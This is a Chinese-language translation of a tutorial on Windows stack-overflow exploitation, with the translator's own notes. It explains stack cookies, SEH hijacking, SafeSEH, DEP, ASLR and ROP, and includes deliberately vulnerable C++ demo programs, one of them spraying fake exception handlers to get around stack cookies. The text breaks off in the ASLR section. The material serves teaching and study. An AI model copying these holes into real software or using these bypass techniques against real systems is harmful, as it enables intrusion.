        <content type="html"><![CDATA[<h1 id="Windows栈溢出"><a href="#Windows栈溢出" class="headerlink" title="Windows栈溢出"></a>Windows栈溢出</h1><p>原文链接：<a href="https://www.cyberark.com/resources/threat-research-blog/a-modern-exploration-of-windows-memory-corruption-exploits-part-i-stack-overflows">Windows 内存损坏漏洞的现代探索 – 第一部分：栈溢出 (cyberark.com)</a></p><p>代码地址：<a href="https://github.com/forrest-orr/ExploitDev">https://github.com/forrest-orr/ExploitDev</a></p><hr><p>前排提示：由于翻译的差异，“栈”与“堆栈”指的实际上是同一个东西，说的都是“stack”，然而，面向大多数刚刚接触编程的同学们，对于“堆”（heap）和“栈”的理解区分至关重要。因此，下文中应为“stack”的地方，统一称作“栈”，但难免有遗漏之处，请读者分清栈或堆栈与堆的区别，并海涵出现的疏忽。</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>通过在现代操作系统上使用现代编译器记录自己的一些实验和研究来帮助解决过时的面向初学者的漏洞利用信息的问题。重点是Windows 10和Visual Studio 2019。</p><h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><p>shellcode是一段用于利用软件漏洞而执行的代码，shellcode为16进制的机器码，因为经常让攻击者获得shell而得名。shellcode常常使用机器语言编写。 可在寄存器eip溢出后，塞入一段可让CPU执行的shellcode机器码，让电脑可以执行攻击者的任意指令。</p><p>shellcode可以按照攻击者执行的位置分为本地shellcode和远程shellcode。</p><h4 id="本地shellcode"><a href="#本地shellcode" class="headerlink" title="本地shellcode"></a>本地shellcode</h4><p>本地运行的shellcode经常用于利用软件漏洞提升权限。比如在Linux下由普通权限提升至root权限。</p><h4 id="远程shellcode"><a href="#远程shellcode" class="headerlink" title="远程shellcode"></a>远程shellcode</h4><p>利用软件漏洞获得特定的shellcode，再经由C或Python编写远程攻击程序，进而取得对方电脑的root权限。</p><h2 id="经典栈溢出"><a href="#经典栈溢出" class="headerlink" title="经典栈溢出"></a>经典栈溢出</h2><p>经典栈溢出是最容易理解的内存损坏漏洞。易受攻击的应用程序包含一个函数，该函数将用户控制的数据写入栈而不验证其长度。这允许攻击者：</p><ol><li>将shellcode写入栈。</li><li>覆盖当前函数的返回地址以指向shellcode。</li></ol><p>如果栈可以在不破坏应用程序的情况下以这种方式损坏，则shellcode将在被利用的函数返回时执行。此概念的示例如下：</p><p>(经过测试，运行这段代码需要在VS中关闭编译设置中的“缓冲区安全检查（GS）”选项)</p><p><img src="/.io//image-20230529140641266-1707050428582.png" alt="image-20230529140641266"></p><p>（我用的vs2022，就算关闭了这个选项它依然进行了缓冲区溢出检查，老版本也许能成功，成功运行后回报的错误应该是“无效的运行地址”，而不是栈溢出。）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdint&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> OverflowData[] =&#123;</span><br><span class="line"><span class="string">&quot;AAAAAAAAAAAAAAAA&quot;</span> <span class="comment">// 16个字节填充缓冲区</span></span><br><span class="line"><span class="string">&quot;BBBB&quot;</span>         <span class="comment">// +4 字节 覆盖安全cookie</span></span><br><span class="line"><span class="string">&quot;CCCC&quot;</span>         <span class="comment">// +4 字节 覆盖Ebp</span></span><br><span class="line"><span class="string">&quot;DDDD&quot;</span>&#125;;        <span class="comment">// +4 字节 覆盖返回地址</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Overflow</span><span class="params">(<span class="type">uint8_t</span>* pInputBuf, <span class="type">uint32_t</span> dwInputBufSize)</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> Buf[<span class="number">16</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">memcpy</span>(Buf, pInputBuf, dwInputBufSize);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int32_t</span> <span class="title">wmain</span><span class="params">(<span class="type">int32_t</span> nArgc, <span class="type">const</span> <span class="type">wchar_t</span>* pArgv[])</span> </span>&#123;</span><br><span class="line">    _tprintf(_T(<span class="string">&quot;... passing %d bytes of data to vulnerable function\r\n&quot;</span>), <span class="built_in">sizeof</span>(OverflowData) - <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">Overflow</span>(OverflowData, <span class="built_in">sizeof</span>(OverflowData) - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中，安全cookie是一个在我们使用的栈下方加入的一个结构：</p><p><img src="/.io//../../../../OneDrive%20-%20office/OneDrive/%E6%96%87%E6%A1%A3%20%E7%AC%94%E8%AE%B0/%E6%A0%88%E6%BA%A2%E5%87%BA/20160419224637920" alt="这里写图片描述"></p><p>程序对cookie的值进行监测，一旦cookie中的值发生变化，则认为程序已经造成了栈溢出，立即退出程序并回报错误。如果在上一步中没有关闭，就会造成这样的结果：</p><p><img src="/.io//image-20230529140319202-1707050428583.png" alt="image-20230529140319202"></p><p><img src="/.io//image-20230529140802964-1707050428583.png" alt="image-20230529140802964"></p><p>栈溢出是一种技术（与字符串格式错误和堆溢出不同）仍然可以<strong>在现代Windows应用程序中利用</strong>，使用与几十年前发布的<a href="https://www.eecs.umich.edu/courses/eecs588/static/stack_smashing.pdf">Smashing the Stack for Fun and Profit</a>相同的方法。但是，现在适用于此类攻击的缓解措施已经非常强大了。</p><p>与字符串格式错误和堆溢出漏洞不同，对于栈溢出来说，攻击者仍然可以使用几十年前“Smashing the Stack for Fun and Profit”一文中提出的方法，来利用现代Windows应用程序中的这种漏洞。然而，现在针对这种攻击的缓解措施已经变得非常强大了。</p><p>在Windows 10上，默认情况下，使用Visual Studio 2019编译的应用程序将继承一组针对栈溢出漏洞的安全缓解措施，其中包括：</p><ol><li>SafeCRT</li><li>栈Cookie与安全的变量排序</li><li>安全的结构化异常处理（SafeSEH）</li><li>数据执行保护（DEP）</li><li>地址空间布局随机化（ASLR）</li><li>结构化异常处理覆盖保护（SEHOP）</li></ol><p>就算让易受攻击的CRT API（如strcpy）“退休”并通过SafeCRT库引入这些API的安全版本（如strcpy_s），也无法全面解决栈溢出的问题。这是因为像memcpy这样的API仍然有效，并且这些CRT API的非POSIX变体也是如此（例如KERNEL32.DLL!lstrcpyA）。当我们试图在Visual Studio 2019中编译包含这些“被退休”的API的应用程序时，会触发严重的编译错误，尽管这些错误是可抑制的。</p><p>栈Cookie是试图“修复”和防止栈溢出漏洞在运行时被利用的第一道防护机制。SafeSEH和SEHOP是在栈Cookie外围工作的两种缓解措复施，而DEP和ASLR并不是针对栈的缓解方法，因为它们并不能防止栈溢出攻击或EIP劫持的发生。相反，它们的作用提高通过这种攻击执行shellcode的难度。所有这些缓解措施都将随着本文的推进而深入探讨。下一节将重点讨论栈Cookie——目前我们在尝试利用栈溢出时的主要对手。</p><h2 id="栈Cookie、GS与GS"><a href="#栈Cookie、GS与GS" class="headerlink" title="栈Cookie、GS与GS++"></a>栈Cookie、GS与GS++</h2><p>随着Visual Studio 2003的发布，微软在其MSVC编译器中加入了一个新的栈溢出防御功能，称为GS。两年后，他们在发布Visual Studio 2005时默认启用了该功能。</p><p>关于GS，网上的信息虽然非常丰富，但是大部分都是过时的和&#x2F;或不完整的信息。之所以出现这种情况，是因为GS的安全缓解措施自最初发布以来已经发生了重大的变化：在Visual Studio 2010中，一个名为GS++的增强版GS取代了原来的GS功能。令人困惑的是，微软从未更新其编译器选项的名称，尽管实际上是GS++，但至今仍是“&#x2F;GS”。</p><p>从根本上说，GS其实是一种安全缓解措施，它被编译进二进制级别的程序，在包含Microsoft所谓的“GS缓冲区”（易受栈溢出攻击的缓冲区）的函数中放置策略性栈损坏检查（借助于栈Cookie）。最初的GS只考虑包含8个或更多元素，元素大小为1或2（字符和宽字符）字节的数组作为GS缓冲区，而GS++对此定义进行了实质性扩展，包括：</p><ol><li>任何数组(无论长度或元素大小)</li><li>结构体(无论其内容是什么)</li></ol><p><img src="/.io//Picture4-1707050428583.png" alt="img"></p><p>这个增强技术对现代栈溢出漏洞有很大的意义，因为它基本上使所有容易受到栈溢出攻击的函数免于受到基于返回地址的EIP劫持技术的影响。这反过来又会对其他陈旧的利用技术产生影响，比如通过部分EIP覆盖来绕过ASLR的技术——2007年著名的Vista CVE-2007-0038 Animated Cursor漏洞就利用结构溢出而流行起来的。随着2010年GS++的出现，在典型的栈溢出情况下，部分EIP覆盖作为ASLR绕过的方法已经失效。</p><p>MSDN上关于GS的信息（最后一次更新是在四年前的2016年），在GS覆盖率方面，与我自己的一些测试结果是相矛盾的。例如，微软将以下变量列为非GS缓冲区的例子：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *pBuf[<span class="number">20</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *pv[<span class="number">20</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> buf[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> buf[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> &#123; <span class="type">int</span> a; <span class="type">int</span> b; &#125;;</span><br></pre></td></tr></table></figure><p>然而在我自己使用VS2019进行的测试中，这些变量都会导致栈Cookie的产生。这说明GS确实被升级为了GS++，且作用域为上述的任何数组(无论长度或元素大小)、结构体(无论其内容是什么)。</p><p>究竟什么是栈Cookie，它们是如何工作的？</p><ol><li>栈Cookie在Visual Studio 2019中是默认设置的。它们可以使用&#x2F;GS标志进行配置，我们可以在项目设置的 Project -&gt; Properties -&gt; C&#x2F;C++ -&gt; Code Generation -&gt; Security Check字段中设置该标志。</li><li>当加载了一个用&#x2F;GS编译的PE时，它会初始化一个新的随机栈Cookie种子值，并将其作为一个全局变量存储在其.data段中。</li><li>每当一个包含GS缓冲区的函数被调用时，它都会将这个栈Cookie种子与EBP寄存器进行XOR运算，并将其存储在保存的EBP寄存器和返回地址之前的栈上。</li><li>在受保护的函数返回之前，它会再次用&gt;EBP对其保存的伪唯一性栈Cookie进行XOR运算，以获得原始的栈Cookie种子值，并进行相应的检查，以确保它仍然与存储在.data段的种子相匹配。</li><li>如果这个值不匹配，应用程序会抛出一个安全异常并终止执行。</li></ol><p>由于攻击者不可能在覆盖返回地址的同时不覆盖函数栈帧中保存的栈Cookie，这种机制能够阻止栈溢出漏洞利用代码通过RET指令劫持EIP，从而达到任意执行代码的目的。</p><p>在现代编译环境中编译并执行之前的栈溢出项目，会出现STATUS_STACK_BUFFER_OVERRUN异常(代码0xC0000409)；使用调试器可以逐步剖析其出错原因。</p><p><img src="/.io//image-20230529145619171-1707050428583.png" alt="image-20230529145619171"></p><p>我们可以看到，一顿开栈操作后，创建了一个位于0x057a028的安全栈cookie，并将这个地址<strong>里面的内容</strong>压入栈。这个内容正好占用的是四个字节。</p><p><img src="/.io//image-20230529150116415-1707050428583.png" alt="image-20230529150116415"></p><p>在memcpy函数返回之后，我们可以看到栈确实被我们的预期数据破坏了，其中包括返回地址EDX，现在已经变为0x44444444。在过去，当这个函数返回时，会出现访问冲突异常，并断言0x44444444是一个要执行的无效地址。但是，栈Cookie安全检查将阻止这种情况。</p><p><img src="/.io//image-20230529152344262-1707050428583.png" alt="image-20230529152344262"></p><p>首次执行该函数时，如果将存储在.data段中的栈Cookie种子与EBP进行XOR运算，然后将其保存到栈中。由于这个值在溢出期间将被值0x42424242所覆盖（如果我们希望能够覆盖返回地址并劫持EIP，这是不可避免的），从而生成有毒的栈Cookie值，即0xa33d2a88（在ECX中可以清楚看到），现在，该值将被传递给内部函数__security_check_Cookie进行验证。</p><p><img src="/.io//image-20230529153040701-1707050428583.png" alt="image-20230529153040701"></p><p>一旦这个函数被调用，就会导致STATUS_STACK_BUFFER_OVERRUN异常（代码0xC0000409）。这虽然会导致进程崩溃，但也防止了攻击者成功利用该漏洞。</p><p>当您熟悉这些概念和实际例子后，会注意到关于栈Cookie的几个“有趣”的事情：</p><ol><li>它们不能防止栈溢出的发生。攻击者仍然可以随心所欲地在栈上覆盖任意数量的数据。</li><li>它们只是针对每个函数的伪随机值。这意味着，如果.data中的栈Cookie种子发生内存泄漏，同时栈指针也发生泄漏，攻击者就可以准确地预测Cookie，并将其嵌入到其溢出中以绕过安全异常。</li></ol><p>从根本上来说（假设它们无法通过内存泄漏进行预测），栈Cookie只能防止我们通过易受攻击的函数的返回地址来劫持EIP。这意味着我们仍然可以以任何方式破坏栈，并能够在安全检查和RET指令之前执行任意代码。那么，这在现代栈溢出的可靠利用过程中有什么价值呢？</p><h2 id="SSH劫持"><a href="#SSH劫持" class="headerlink" title="SSH劫持"></a>SSH劫持</h2><p>进程中的每个线程都可以注册handler函数（默认情况下也是如此），以便在触发异常时进行调用。这些handler函数的指针通常存储在栈上的EXCEPTION_REGISTRATION_RECORD结构体中。在任何版本的Windows上启动一个32位应用程序时，都至少会注册一个这样的handler，并将相关数据存储在栈中，具体如下图所示：</p><p>(VS找不到，IDA也没有这个关键字，只能用别人的图了)</p><p><img src="/.io//../../../../OneDrive%20-%20office/OneDrive/%E6%96%87%E6%A1%A3%20%E7%AC%94%E8%AE%B0/%E6%A0%88%E6%BA%A2%E5%87%BA/v2-9fda65d79a3df60bdc1df9b7d99346f8_1440w.webp" alt="img"></p><p>上面高亮显示的EXCEPTION_REGISTRATION_RECORD结构体包含一个指向下一个SEH记录的指针（也存储在栈上），后面是指向handler函数的指针（在本例中是NTDLL.DLL库中的函数）。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_EXCEPTION_REGISTRATION_RECORD</span> &#123;</span><br><span class="line"></span><br><span class="line">PEXCEPTION_REGISTRATION_RECORD Next;</span><br><span class="line"></span><br><span class="line">PEXCEPTION_DISPOSITION Handler;</span><br><span class="line"></span><br><span class="line">&#125; EXCEPTION_REGISTRATION_RECORD, *PEXCEPTION_REGISTRATION_RECORD;</span><br></pre></td></tr></table></figure><p>在内部，指向SEH handler列表的指针都存储在每个线程的TEB的偏移量0处，并且每个EXCEPTION_REGISTION_RECORD都链接到下一个。如果handler不能正确处理抛出的异常，它会将执行权移交给下一个handler，以此类推。</p><p><img src="/.io//Picture11-1707050428583.png" alt="img"></p><p>因此，SEH实际上为攻击者提供了绕过栈Cookie的理想方法。我们可以利用栈溢出，覆盖现有的SHE handler(肯定至少会有一个)，然后让应用程序崩溃(考虑到我们有能力破坏栈内存，这肯定不在话下)。这将导致在易受攻击函数最后调用__SECURITY_CHECK_COOKIE之前，EIP被重定向到EXCEPTION_REGISTION_RECORD结构体中被覆盖后的handler地址。因此，在执行shellcode之前，应用程序根本没有机会发现其栈已被破坏。因此，我们可以用自定义的SEH handler喷射栈，覆盖现有的EXCEPTION_REGISTRATION_RECORD结构体。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdint&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Overflow</span><span class="params">(<span class="type">uint8_t</span>* pInputBuf, <span class="type">uint32_t</span> dwInputBufSize)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> Buf[<span class="number">16</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(Buf, pInputBuf, dwInputBufSize);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">EXCEPTION_DISPOSITION __cdecl <span class="title">FakeHandler</span><span class="params">(EXCEPTION_RECORD* pExceptionRecord, <span class="type">void</span>* pEstablisherFrame, CONTEXT* pContextRecord, <span class="type">void</span>* pDispatcherContext)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">_tprintf(_T(<span class="string">&quot;... fake exception handler executed at 0x%p\r\n&quot;</span>), FakeHandler);</span><br><span class="line"></span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ExceptionContinueExecution;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int32_t</span> <span class="title">wmain</span><span class="params">(<span class="type">int32_t</span> nArgc, <span class="type">const</span> <span class="type">wchar_t</span>* pArgv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> dwOverflowSize = <span class="number">0x20000</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span>* pOverflowBuf = (<span class="type">uint8_t</span>*)<span class="built_in">HeapAlloc</span>(<span class="built_in">GetProcessHeap</span>(), <span class="number">0</span>, dwOverflowSize);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_tprintf(_T(<span class="string">&quot;... spraying %d copies of fake exception handler at 0x%p to the stack...\r\n&quot;</span>), dwOverflowSize / <span class="number">4</span>, FakeHandler);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">uint32_t</span> dwOffset = <span class="number">0</span>; dwOffset &lt; dwOverflowSize; dwOffset += <span class="number">4</span>) &#123;</span><br><span class="line"></span><br><span class="line">*(<span class="type">uint32_t</span>*)&amp;pOverflowBuf[dwOffset] = *(<span class="type">uint32_t</span>*)FakeHandler;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_tprintf(_T(<span class="string">&quot;... passing %d bytes of data to vulnerable function\r\n&quot;</span>), dwOverflowSize);</span><br><span class="line"></span><br><span class="line"><span class="built_in">Overflow</span>(pOverflowBuf, dwOverflowSize);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/.io//v2-cb24919b0ed83d7d0ad9fef761c7f0e7_1440w-1707050428583.webp" alt="img"></p><p>我们得到的不是EXE中FakeHandler函数上的断点，而是得到一个STATUS_INVALID_EXCEPTION_HANDLER异常(代码0xC00001A5)。这是一个源于SafeSEH的安全缓解异常。SafeSEH是一个安全缓解措施，仅适用于32位PE文件。在64位PE文件中，一个名为IMAGE_DIRECTORY_ENTRY_EXCEPTION的永久性（非可选）数据目录取代了原来在32位PE文件中的IMAGE_DIRECTORY_ENTRY_RIGHT数据目录。SafeSEH与GS特性都是在Visual Studio 2003版本中发布的，随后在Visual Studio 2005版本中成为了默认设置。</p><p>什么是SafeSEH，它是如何工作的？</p><ol><li>在Visual Studio 2019中，SafeSEH是默认设置的。它通过使用&#x2F;SAFESEH标志进行配置，我们可以在Project -&gt; Properties -&gt; Linker -&gt; Advanced -&gt; Image Has Safe Exception Handlers中进行相应的设置。</li><li>SafeSEH编译的PE文件含有一个有效的SEH handler地址列表，位于名为SEHandlerTable的表中，我们可以在其IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG数据目录中指定。</li><li>每当触发异常时，在执行EXCEPTION_REGISTRATION_RECORD链表中的每个handler的地址之前，Windows会检查该handler是否位于映像内存的范围内（表明它与加载的模块有关），如果是的话，就会用它的SEHandlerTable检查这个handler地址对有关模块是否有效。</li></ol><p>在上图中，我们是通过栈溢出的方式来注册handler的，通过这种方式创建的handler是无法被编译器所识别的（因此，也不会添加到SEHandlerTable中）。通常情况下，编译器会将作为__try __except语句的副作用而创建的handler添加到这个表中。在禁用SafeSEH后，再次运行这段代码会导致栈溢出，执行被喷入的handler。</p><p>下图所示为栈溢出，导致执行了伪造的SEH handler，该handler被编译为PE EXE映像的主映像。</p><p><img src="/.io//Picture15-1707050428583.png" alt="img"></p><p>当然，虽然自2005年以来Visual Studio就默认启用了SafeSEH，但是，在现代应用程序中是否仍然存在禁用了SafeSEH的已加载PE代码呢？在自己探索这个问题的时候，我写了一个PE文件扫描工具，以便在系统范围内检测每个文件是否存在（或缺乏）漏洞缓解措施。当我使用这个扫描工具处理我的Windows 10虚拟机上的SysWOW64文件夹（并对非SafeSEH PEs进行过滤）后，结果令人大跌眼镜。</p><p><img src="/.io//Picture16-1707050428583.png" alt="img"></p><p>看来，微软本身也有相当多的非SafeSEH PE，特别是至今仍在随Windows10一起提供的DLL。扫描我的Program Files文件夹后，得到的结果则更有说服力，大约有7%的PE文件缺乏SafeSEH保护。事实上，尽管我的虚拟机上安装的第三方应用程序很少，但从7-zip、Sublime Text到VMWare Tools，几乎每个应用程序都至少含有一个非SafeSEH模块。即使在进程的地址空间中只有一个这样的模块，也足以绕过其栈Cookie缓解措施，进而使用本文中探讨的技术利用栈溢出漏洞。</p><p>值得注意的是，在如下所示两种不同的情况下，SafeSEH可以被认为对PE生效的，它们是我的工具在扫描中使用的标准：</p><ol><li>在IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG数据目录中存在上述的SEHandlerTable以及SEHandlerCount大于零的情况。</li><li>IMAGE_DLLCHARACTERISTICS_NO_SEH标志被设置在IMAGE_OPTIONAL_HEADER.DllCharacteristics的header字段。</li></ol><p>假设一个没有采用SafeSEH措施的模块被加载到一个易受攻击的应用程序中，对于exploit编写者来说，仍然还面临令一个重要的障碍。回到图10，尽管一个伪造的SEH HANDLER通过栈溢出被成功执行，但是这个handler被编译到了PE EXE映像本身中。所以，为了实现任意代码执行，我们需要执行一个存储在栈上的伪造SEH HANDLER（一个shellcode）。</p><h2 id="DEP-amp-ASLR"><a href="#DEP-amp-ASLR" class="headerlink" title="DEP &amp; ASLR"></a>DEP &amp; ASLR</h2><p>由于存在DEP和ASLR防御机制，在栈上将我们的shellcode用作伪异常handler存在多个障碍：</p><ol><li>由于存在ASLR机制，我们不知道Shellcode在栈上的地址，因此无法将其嵌入到我们的溢出内容中以喷射到栈中。</li><li>由于存在DEP机制，在默认情况下，栈本身以及扩展的shellcode是不可执行的。</li></ol><p>随着2004年Windows XP SP2的问世，DEP首次在Windows世界得到了广泛的采用，并且从那时起，DEP已经成为当今使用的几乎所有现代应用程序和操作系统的普遍特性。它是通过使用硬件层内存页的PTE头部中的一个特殊位（NX，也就是不可执行位）来实现的，默认情况下，该位将在Windows中所有新分配的内存上被设置。这意味着攻击者必须显式创建可执行内存区域，方法是通过诸如KERNEL32.DLL!VirtualAlloc之类的API分配具有可执行权限的新内存，或者通过使用诸如KERNEL32.DLL!VirtualProtect之类的API将现有的非可执行内存修改为可执行的。这样做的一个副作用是，由于栈和堆在默认情况下都是不可执行的，因此，我们无法直接从这些位置执行shellcode，换句话说，我们必须首先为它开辟一个可执行的内存区域。</p><p>从exploit编写的角度来看，理解DEP的关键在于，DEP是一种要么全有要么全无的缓解措施：要么应用于进程内的所有内存，要么不应用于进程内的所有内存。如果使用&#x2F;NXCOMPAT标志编译生成进程的主EXE，则整个进程将启用DEP。与诸如SafeSEH或ASLR之类的缓解措施形成鲜明对比的是，并不存在非DEP DLL模块之类的东西。</p><p>从exploit编写的角度来看，DEP的解决方案早已被理解为面向返回的编程（ROP）。原则上，现有的可执行内存将与攻击者提供的栈一起以小片段的形式回收，以实现为我们的shellcode划分可执行区域的目标。创建自己的ROP链时，我选择使用KERNEL32.DLL!VirtualProtect API，以便使存放shellcode的栈区域是可执行的。该API的原型如下所示：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">VirtualProtect</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function"></span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID lpAddress,</span></span></span><br><span class="line"><span class="params"><span class="function"></span></span></span><br><span class="line"><span class="params"><span class="function">SIZE_T dwSize,</span></span></span><br><span class="line"><span class="params"><span class="function"></span></span></span><br><span class="line"><span class="params"><span class="function">DWORDflNewProtect,</span></span></span><br><span class="line"><span class="params"><span class="function"></span></span></span><br><span class="line"><span class="params"><span class="function">PDWORD lpflOldProtect</span></span></span><br><span class="line"><span class="params"><span class="function"></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>在ASLR问世之前，如果可以通过溢出来控制栈，就可以将这五个参数作为常量植入栈，然后触发一个EIP重定向，使其指向KERNEL32.DLL中的VirtualProtect函数（其基地址是静态的）。在这里，唯一的障碍是——我们不知道作为第一个参数传递或作为返回地址使用的shellcode的确切地址。后来，攻击者利用NOP sledding技术（在shellcode的前面填充一大段NOP指令，即0x90）解决了这个问题。然后，exploit编写者可以推断出shellcode在栈中的大致区域，并在这个范围内选取一个地址并将其直接植入溢出内容中，从而通过NOP sled将这个猜测转化为精确的代码执行。</p><p>随着2006年Windows Vista中ASLR的出现，ROP链的创建变得有些棘手，因为现在：</p><ol><li>DLL的基址和VirtualProtect的基址变得不可预测。</li><li>shellcode的地址难以猜测。</li><li>包含可执行代码片段的模块的地址变得不可预测。</li></ol><p>这不仅对ROP链提出了更多的要求，同时，还要求其实现要更加精确，因此，NOP sled（1996年左右的经典形式）成为ASLR时代的牺牲品。这也导致了ASLR绕过技术成为了DEP绕过技术的前提条件。如果不绕过ASLR，从而至少定位含有漏洞的进程中一个模块的基地址，就无法知道ROP Gadget的地址，从而无法执行ROP链，也就无法调用VirtualProtect函数来绕过DEP。</p><p>要创建一个现代的ROP链，我们首先需要这样一个模块：我们可以在运行时预测其基地址的模块。在大多数现代漏洞利用技术中，这是通过使用内存泄漏漏洞来实现的（这个主题将在本系列的字符串格式错误和堆损坏续集中加以探讨）。为了简单起见，我选择在易受攻击进程的地址空间中引入一个非ASLR模块（来自我的Windows 10虚拟机的SysWOW64目录）。在继续之前，必须了解非ASLR模块背后的概念（以及在exploit编写过程中的作用）。</p><p>从exploit编写的角度来看，以下是我认为最有价值的ASLR概念：</p><ol><li>在Visual Studio 2019中，ASLR是默认设置的。它使用&#x2F;DYNAMICBASE标志进行配置，我们可以在项目设置的Project -&gt; Properties -&gt; Linker -&gt; Advanced -&gt; Randomized Base 